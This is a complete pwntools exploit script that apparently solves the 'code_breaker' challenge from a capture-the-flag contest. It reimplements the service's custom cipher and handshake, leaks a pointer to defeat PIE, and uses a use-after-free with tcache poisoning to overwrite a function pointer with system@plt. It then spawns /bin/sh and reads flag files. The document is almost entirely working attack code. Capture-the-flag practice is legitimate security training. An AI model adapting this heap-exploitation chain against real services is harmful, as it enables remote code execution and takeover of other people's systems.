#!/usr/bin/env python3
import sys, struct
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

BIN = './code_breaker'
elf = ELF(BIN, checksec=False)
SBOX = elf.read(0x2040, 256)          # substitution box
assert len(SBOX) == 256

# PIE offsets
OFF_FUNCPTR   = 0x40c0   # global function pointer (default -> 0x1390 nop)
OFF_INITPTR   = 0x1390   # value stored in funcptr at startup (INFO leak -> PIE)
OFF_SYSTEM_PLT= 0x1150   # system@plt.sec

# ---------------------------------------------------------------------------
# Cipher: keystream byte for (running counter C, in-message index i) is
#   SBOX[ (C + i + key[i & 15]) & 0xff ]
# ct[i] = pt[i] ^ ks   (symmetric)
# ---------------------------------------------------------------------------
class Cipher:
    def __init__(self, key):
        self.key = bytes(key)
        self.c2s = 0   # counter server uses to DECRYPT our msgs (we encrypt with it)
        self.s2c = 0   # counter server uses to ENCRYPT (we decrypt with it)

    def _crypt(self, ctr, data):
        out = bytearray(len(data))
        for i, b in enumerate(data):
            k = (ctr + i + self.key[i & 15]) & 0xff
            out[i] = b ^ SBOX[k]
        return bytes(out)

    def enc(self, pt):
        ct = self._crypt(self.c2s, pt)
        self.c2s = (self.c2s + len(pt)) & 0xffffffff
        return ct

    def dec(self, ct):
        pt = self._crypt(self.s2c, ct)
        self.s2c = (self.s2c + len(ct)) & 0xffffffff
        return pt

# ---------------------------------------------------------------------------
# Key derivation (setup 0x1670):  M = R(16) || C(16)
#   for t in 0..3:  for j in 0..15:
#     key[j] = rol3( SBOX[ key[j] ^ M[(j+8t)&31] ] ^ M[3t+j] )
# ---------------------------------------------------------------------------
def rol3(x):
    x &= 0xff
    return ((x << 3) | (x >> 5)) & 0xff

def derive_key(R, C):
    M = bytes(R) + bytes(C)
    key = bytearray(16)
    for t in range(4):
        for j in range(16):
            v = SBOX[(key[j] ^ M[(j + 8*t) & 31])] ^ M[3*t + j]
            key[j] = rol3(v)
    return bytes(key)

def calc_mac(key):
    return bytes(key[(a+5) & 15] ^ SBOX[key[a]] for a in range(16))

# ---------------------------------------------------------------------------
# Framing: 2-byte big-endian length prefix, then raw bytes.
# ---------------------------------------------------------------------------
def send_frame(io, data):
    io.send(struct.pack('>H', len(data)) + data)

def recv_frame(io):
    ln = struct.unpack('>H', io.recvn(2))[0]
    return io.recvn(ln) if ln else b''

# ---------------------------------------------------------------------------
def handshake(io):
    # packet1 (plaintext): [01][R16]
    p1 = recv_frame(io)
    assert p1[0] == 1, p1.hex()
    R = p1[1:17]
    log.info("server random R = %s", R.hex())

    C = b'\x41' * 16               # our client bytes (arbitrary)
    key = derive_key(R, C)
    log.info("derived key    = %s", key.hex())
    ci = Cipher(key)

    # packet2 (plaintext): [02][C16..] len>16
    send_frame(io, b'\x02' + C)

    # packet3 (encrypted, c2s ctr=0): [03][MAC16]
    mac = calc_mac(key)
    pt3 = b'\x03' + mac
    send_frame(io, ci.enc(pt3))    # advances c2s -> 17

    # server replies with 2-byte encrypted status (s2c ctr 0 -> 2)
    status = ci.dec(recv_frame(io))
    log.info("handshake status = %s", status.hex())
    assert status[1] == 0x00, "handshake failed: %s" % status.hex()
    return ci

# ---- command helpers (built on the encrypted channel) --------------------
class Client:
    def __init__(self, io, ci):
        self.io = io; self.ci = ci
    def cmd(self, pt, expect=True):
        send_frame(self.io, self.ci.enc(pt))
        if expect:
            return self.ci.dec(recv_frame(self.io))
        return None
    def store(self, key, data):
        p = b'\x10' + bytes([key]) + struct.pack('>H', len(data)) + data
        return self.cmd(p)
    def get(self, key):
        r = self.cmd(b'\x11' + bytes([key]))
        ln = struct.unpack('>H', r[2:4])[0]
        return r[4:4+ln]
    def update(self, key, data):
        p = b'\x12' + bytes([key]) + struct.pack('>H', len(data)) + data
        return self.cmd(p)
    def delete(self, key):
        return self.cmd(b'\x13' + bytes([key]))
    def link(self, dst, src):
        return self.cmd(b'\x14' + bytes([dst, src]))
    def info(self):
        return self.cmd(b'\x16')
    def execute(self, data, expect=False):
        # calls funcptr(data); do not wait for reply (system may block)
        return self.cmd(b'\x15' + data, expect=expect)

# ---------------------------------------------------------------------------
def exploit(io):
    ci = handshake(io)
    c = Client(io, ci)

    # 1) INFO leak -> PIE base
    info = c.info()
    funcptr = u64(info[2:10])
    pie = funcptr - OFF_INITPTR
    log.success("funcptr leak = %#x -> PIE base = %#x", funcptr, pie)
    assert pie & 0xfff == 0, "bad PIE leak"
    system_plt = pie + OFF_SYSTEM_PLT
    target     = pie + OFF_FUNCPTR

    L = 0x18   # -> tcache idx 0 (chunk 0x20)

    # ---- Phase 1: heap leak (single freed chunk, safe-link next=0) ----
    c.store(0, b'A'*L)          # alpha, slot0 rc1
    c.link(2, 0)                # slot0(src) rc2, slot2 alias
    c.delete(0)                 # free(alpha); slot0 rc 2->1 retained; tcache=[alpha]
    leak = c.get(0)             # alpha->next = alpha>>12
    heap_key = u64(leak[:8])    # == alpha >> 12
    log.success("heap safe-link key (alpha>>12) = %#x", heap_key)

    # ---- Phase 2: poison ----
    c.store(1, b'B'*L)          # reclaim alpha as slot1 (tcache now empty). key field != tcache_key
    c.store(3, b'C'*L)          # fresh chunk beta, slot3
    c.delete(3)                 # tcache=[beta] count1
    c.delete(0)                 # free(alpha) again; slot0 rc 1->0 nulled; tcache=[alpha->beta] count2
                                # slot1 & slot2 still alias alpha (UAF), alpha at top

    poison = p64(heap_key ^ target)
    c.update(1, poison)         # overwrite alpha->next -> target (safe-linked)
    log.info("poisoned alpha->next -> %#x", target)

    c.store(4, b'D'*L)          # malloc -> alpha (count 2->1, top=target)
    c.store(5, p64(system_plt) + b'\x00'*(L-8))   # malloc -> target(0x40c0): funcptr = system@plt
    log.success("funcptr overwritten with system@plt = %#x", system_plt)

    # ---- trigger: EXEC calls funcptr("/bin/sh") = system("/bin/sh") ----
    c.execute(b'/bin/sh\x00', expect=False)

    io.sendline(b'id; cat flag* /flag* 2>/dev/null; ls -la')
    try:
        data = io.recvrepeat(2.0)
        sys.stdout.buffer.write(data)
        m = re.search(rb'sun\{[^}]*\}', data)
        if m:
            log.success("FLAG: %s", m.group().decode())
    except Exception as e:
        log.warning("recv err: %s", e)
    io.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        io = remote('chal.sunshinectf.games', 26005)
    else:
        io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', BIN])
    exploit(io)
